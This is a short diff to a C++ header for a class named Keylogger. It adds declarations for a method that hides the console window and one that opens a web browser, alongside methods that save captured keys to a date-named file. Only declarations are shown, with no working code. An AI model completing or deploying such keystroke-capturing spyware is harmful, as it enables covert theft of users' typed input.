@@ -9,6 +9,8 @@ private:
 	short escapeCounter;
 	FILE *file;
 
+	void __fastcall hideConsole();
+	void openInternetBrowser();
 	void getNameOfFileFromLocalDate();
 	bool isCreatedFile();
 	void saveKeys();
@@ -17,7 +19,7 @@ private:
 	void countIfEscape(int pressedKey);
 
 public:
-	Keylogger(const char * _fileName);
-	Keylogger();
+	__fastcall Keylogger(const char * _fileName);
+	__fastcall Keylogger();
 	~Keylogger();
 };
